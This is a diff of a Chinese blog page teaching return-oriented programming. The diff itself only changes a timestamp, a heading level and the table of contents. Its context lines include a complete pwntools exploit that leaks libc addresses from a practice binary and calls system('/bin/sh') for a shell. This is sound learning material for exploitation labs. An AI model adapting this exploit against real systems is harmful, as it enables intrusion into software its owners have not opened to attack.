@@ -103,7 +103,7 @@
 <meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/59330818057a3.png">
 <meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/59330817e33ff.png">
 <meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/593308118de6b.png">
-<meta property="og:updated_time" content="2017-06-03T19:06:16.000Z">
+<meta property="og:updated_time" content="2017-06-03T19:09:18.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN 学习之 ROP篇">
 <meta name="twitter:description" content="一 、序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。参考文章">
@@ -396,7 +396,7 @@
 <hr>
 <p>在write执行完成后需要二次溢出，所以我们在write执行完后需要调用原函数一次。栈空间分布如下图：<br><img src="https://ooo.0o0.ooo/2017/06/04/59330817e33ff.png" alt="14941654146332.png"></p>
 <p>最后通过ret2libc执行我们最终的 system(“/bin/sh”)</p>
-<h4 id="leak-得到函数的泄露地址"><a href="#leak-得到函数的泄露地址" class="headerlink" title="leak 得到函数的泄露地址"></a>leak 得到函数的泄露地址</h4><p>上面绕过ASLR我们需要libc.so来计算system 等数据的地址。当往往我们并没有对方的libc.so。这意味我们无法直接得到函数地址。此时我们需要pwntools提供的DynELF,构造一个leak,不停的去读写libc，找到我们需要的函数地址，代码如下：</p>
+<h2 id="leak-得到函数的泄露地址"><a href="#leak-得到函数的泄露地址" class="headerlink" title="leak 得到函数的泄露地址"></a>leak 得到函数的泄露地址</h2><p>上面绕过ASLR我们需要libc.so来计算system 等数据的地址。当往往我们并没有对方的libc.so。这意味我们无法直接得到函数地址。此时我们需要pwntools提供的DynELF,构造一个leak,不停的去读写libc，找到我们需要的函数地址，代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env pythonfrom pwn import *p = process(&apos;./level2&apos;)elf = ELF(&apos;level2&apos;)#p = remote(&apos;127.0.0.1&apos;, 10003)plt_write= elf.symbols[&apos;write&apos;]plt_read  = elf.symbols[&apos;read&apos;]print &apos;plt_write= &apos; + hex(plt_write)print &apos;plr_read= &apos;+hex(plt_read)vulfun_addr = 0x8048436print &apos;vulfun= &apos; + hex(vulfun_addr)main_addr=elf.symbols[&apos;main&apos;]def leak(address):	payload=&quot;A&quot;*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(address)+p32(4)	p.sendline(payload)	data=p.recv(4)	log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;)))	return dataprint recvline()dynelf=DynELF(leak,elf=ELF(&quot;level2&quot;))systemAddress=dynelf.lookup(&apos;system&apos;,&apos;libc&apos;)print &quot;systemAddress: &quot;,hex(systemAddress)bss_addr=elf.symbols[&apos;__bss_start&apos;]print &quot;bss_addr: &quot;,hex(bss_addr)pop_addr=0x80484bdpayload1=&quot;A&quot;*140+p32(plt_read)+p32(pop_addr)+p32(0)+p32(bss_addr)+p32(8)payload1+=p32(systemAddress)+p32(vulfun_addr)+p32(bss_addr)p.sendline(payload1)p.sendline(&quot;/bin/sh\0&quot;)p.interactive()</div></pre></td></tr></table></figure>
 <p>效果图：<br><img src="https://ooo.0o0.ooo/2017/06/04/593308118de6b.png" alt="14941748383625.png"></p>
 
@@ -574,7 +574,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-、序"><span class="nav-number">1.</span> <span class="nav-text">一 、序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序流劫持"><span class="nav-number">2.</span> <span class="nav-text">程序流劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-无防护"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.无防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Ret2libc-Bypass-DEP-通过ret2libc-绕过DEP防护"><span class="nav-number">2.0.2.</span> <span class="nav-text">2 Ret2libc-Bypass DEP 通过ret2libc 绕过DEP防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、ROP-ByPass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><span class="nav-number">2.0.3.</span> <span class="nav-text">3、ROP-ByPass DEP and ASLR 通过ROP绕过DEP和ASLR防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#leak-得到函数的泄露地址"><span class="nav-number">2.0.4.</span> <span class="nav-text">leak 得到函数的泄露地址</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-、序"><span class="nav-number">1.</span> <span class="nav-text">一 、序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序流劫持"><span class="nav-number">2.</span> <span class="nav-text">程序流劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-无防护"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.无防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Ret2libc-Bypass-DEP-通过ret2libc-绕过DEP防护"><span class="nav-number">2.0.2.</span> <span class="nav-text">2 Ret2libc-Bypass DEP 通过ret2libc 绕过DEP防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、ROP-ByPass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><span class="nav-number">2.0.3.</span> <span class="nav-text">3、ROP-ByPass DEP and ASLR 通过ROP绕过DEP和ASLR防护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-得到函数的泄露地址"><span class="nav-number">3.</span> <span class="nav-text">leak 得到函数的泄露地址</span></a></li></ol></div>
             
 
           </div>
